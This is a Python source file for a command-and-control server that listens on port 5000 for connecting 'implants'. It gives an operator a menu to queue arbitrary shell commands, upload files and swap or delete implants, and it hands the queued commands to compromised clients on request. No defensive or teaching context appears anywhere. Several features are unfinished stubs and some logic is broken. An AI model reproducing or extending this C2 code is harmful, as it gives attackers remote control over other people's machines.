import socket
import os
import threading


class C2Server:
    def __init__(self):
        # self.find_current_implant()
        self.port = 5000
        self.host = "0.0.0.0"
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.cur_implant = "implant_1.java"
        self.cur_implant_hash, self.cur_implant_path = self.find_current_implant()
        self.selected_command = "na"
        self.args = None
        self.file_name = None

    def listen(self):
        print("Listening for conns")
        self.sock.listen(10)
        while True:
            clientConn, addr = self.sock.accept()
            print("Accepted client from:", addr)
            clientConn.settimeout(69)
            threading.Thread(
                target=ClientHandler,
                args=(
                    clientConn,
                    addr,
                    self.selected_command,
                    self.cur_implant_hash,
                    self.cur_implant_path,
                    self.args,
                ),
            ).start()
            self.printMenu()

    def invalidChoice(self):
        return input("Error: Invalid choice..")

    def printMenu(self):
        print("\n------------------------------------")
        print("Currently selected implant: " + str(self.cur_implant))
        print("Currently selected operation: " + str(self.selected_command))
        if self.selected_command == "bc":
            print("Currently selected command: " + str(self.args))
        if self.selected_command == "dl":
            print("Currently selected file: " + str(self.args))
        print(
            """ 

1.) Execute single command
2.) Upload file to implant
3.) Upload script
4.) Choose new implant
5.) Kill and delete implant
6.) Do nothing

        """
        )
        print("Select option:")

    def setCommmandAndArgs(self, selection):
        if selection == 1:
            self.selected_command = "bc"
            self.args = input("Type command to be excuted: ")
        elif selection == 2:
            self.selected_command = "dl"
            self.args = input("Type filename of file: ")
        elif selection == 3:
            pass
        elif selection == 4:
            self.cur_implant = input("Type filename of implant: ")
            self.cur_implant_hash, self.cur_implant_path = self.find_current_implant()
        elif selection == 5:
            choice = input("Are you sure(yes/no)? ")
            if choice == "yes":
                input("Killing and deleting implant...")
            elif choice == "no":
                input("Implant not deleted...")
            else:
                self.invalidChoice()
        elif selection == 6:
            self.selected_command = "na"
            self.args = ""
            print("Opertation Cleared...")
        else:
            self.invalidChoice()

    def run(self):
        threading.Thread(target=self.listen).start()
        while True:
            self.printMenu()
            selection = int(input())
            self.setCommmandAndArgs(selection)

    def find_current_implant(self):
        implant = {}
        if not os.path.isfile("./implants/" + str(self.cur_implant)):
            self.invalidChoice()
            self.cur_implant = "implant_1.java"  # This should be default implant
        for file in os.listdir("./implants"):
            if file.endswith(".java") and file == self.cur_implant:
                implant_path = os.path.join("./implants", file)
                cur_implant = int(os.path.getctime(implant_path))
                implant[cur_implant] = implant_path
        if cur_implant:
            with open("current_hash.txt", "w") as f:
                f.write(str(cur_implant))
            return cur_implant, implant[cur_implant]


class ClientHandler:
    def __init__(
        self,
        clientConn: socket,
        addr,
        selected_command,
        cur_implant_hash,
        cur_implant_path,
        args,
    ) -> None:
        self.clientConn = clientConn
        self.addr = addr
        self.MSGSIZE = 4096
        self.selected_command = selected_command
        self.args = args
        self.cur_implant_hash = cur_implant_hash
        self.cur_implant_path = cur_implant_path
        self.main()

    def sendMsg(self, message: str):
        sendMsg = message.encode()
        self.clientConn.send(sendMsg)

    def recvMsg(self):
        receivedMessage = self.clientConn.recv(self.MSGSIZE).decode("utf-8")
        return receivedMessage

    def sendFile(self, path: str):
        print("sending")
        with open(path, "r") as f:
            while True:
                bytesRead = f.read(self.MSGSIZE)
                if not bytesRead:
                    print("done sending file")
                    break
                self.sendMsg(bytesRead)
        print("done")

    def doAction(self, command: str, arguments: list[str]):
        if command == "hash":  # Send current hash back
            self.sendMsg(str(self.cur_implant_hash))
        elif command == "update":  # TODO send updated hash if implant is outdated
            self.sendMsg("New Hash: " + str(self.cur_implant_hash))
        elif command == "what":  # Send command back to implant
            if self.selected_command == "na":
                self.sendMsg("na")
            elif self.selected_command == "bc":
                self.sendMsg("bc " + self.args)

    def main(self):
        while True:
            try:
                data = self.recvMsg()
                if data:
                    # *args in the format ["arg1", "arg2"]
                    command, *args = data.split()
                    self.doAction(command, args)
            except Exception as e:
                print(e)
                print("closing connection forcibly, exception")
                self.clientConn.close()


def main():
    c2 = C2Server()
    c2.run()


if __name__ == "__main__":
    main()
